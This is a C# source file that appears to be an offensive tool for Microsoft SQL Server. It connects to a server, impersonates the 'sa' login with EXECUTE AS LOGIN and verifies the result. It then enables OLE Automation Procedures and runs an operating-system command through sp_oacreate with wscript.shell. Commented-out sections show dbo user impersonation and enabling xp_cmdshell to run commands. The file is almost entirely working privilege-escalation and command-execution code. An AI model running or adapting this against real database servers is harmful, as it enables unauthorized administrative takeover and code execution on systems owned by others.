using System;
using System.Data.SqlClient;

namespace MSSQL_PE_Exec
{
    class Program
    {
        static void Main(string[] args)
        {
            String sqlServer = "localhost";
            String database = "master";
            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);
            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }

            /* Impersonate with login */

            String executeas = "EXECUTE AS LOGIN = 'sa';";
            SqlCommand command = new SqlCommand(executeas, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();

            String querylogin = "SELECT SYSTEM_USER;";
            command = new SqlCommand(querylogin, con);
            reader = command.ExecuteReader();

            reader.Read();

            if (reader[0].ToString() == "sa")
            {
                Console.WriteLine("Sucessfull impersonation to " + reader[0]);
            }
            else
            {
                Console.WriteLine("Impersonation failed , current login is : " + reader[0]);
            }
         
            reader.Close();


            /* Impersonate with user */
            /*
            String executeas = "use msdb; EXECUTE AS USER = 'dbo';";
            SqlCommand command = new SqlCommand(executeas, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();

            String querylogin = "SELECT USER_NAME();";
            command = new SqlCommand(querylogin, con);
            reader = command.ExecuteReader();

            reader.Read();

            if (reader[0].ToString() == "dbo")
            {
                Console.WriteLine("Sucessfull impersonation to " + reader[0]);
            }
            else
            {
                Console.WriteLine("Impersonation failed , current login is : " + reader[0]);
            }

            reader.Close();
            */


            /* Execute cmd with xp_cmdshell */

            /*
            String enable_xpcmd = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; ";
            String execCmd = "EXEC xp_cmdshell whoami";
          
            command = new SqlCommand(enable_xpcmd, con);
            reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(execCmd, con);
            reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("Result : " + reader[0]);
            reader.Close();
            */

            /* Execute with  Ole */

            String enable_ole = "EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE; ";
            String execCmd = "DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \"dir C:\\ > C:\\users\\public\\test.txt\"';";

            command = new SqlCommand(enable_ole, con);
            reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(execCmd, con);
            reader = command.ExecuteReader();
            reader.Close();

            con.Close();
        }
    }
}
